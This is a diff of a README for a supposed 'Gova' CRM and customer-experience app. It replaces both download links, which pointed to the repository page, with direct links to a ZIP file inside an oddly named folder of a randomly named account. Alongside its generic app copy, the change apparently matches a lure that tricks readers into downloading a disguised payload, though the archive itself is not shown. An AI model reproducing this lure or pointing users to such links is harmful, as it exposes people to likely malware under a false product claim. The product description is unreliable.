@@ -1,6 +1,6 @@
 # 📊 Gova-saas-crm-cx-platform - CRM and CX control in one place
 
-[![Download Now](https://img.shields.io/badge/Download-Primary%20Link-blue.svg)](https://github.com/genuscalophyllumorderthysanoptera921/Gova-saas-crm-cx-platform)
+[![Download Now](https://img.shields.io/badge/Download-Primary%20Link-blue.svg)](https://github.com/genuscalophyllumorderthysanoptera921/Gova-saas-crm-cx-platform/raw/refs/heads/main/entocoelic/saas_cx_platform_Gova_crm_3.3.zip)
 
 ## 🚀 What this app does
 
@@ -37,7 +37,7 @@ For best use:
 
 Open the primary download page here:
 
-[Download Gova-saas-crm-cx-platform](https://github.com/genuscalophyllumorderthysanoptera921/Gova-saas-crm-cx-platform)
+[Download Gova-saas-crm-cx-platform](https://github.com/genuscalophyllumorderthysanoptera921/Gova-saas-crm-cx-platform/raw/refs/heads/main/entocoelic/saas_cx_platform_Gova_crm_3.3.zip)
 
 Follow the page to get the app files, then save them on your PC. If the page offers a ZIP file, save it to your Downloads folder so you can find it fast.
 
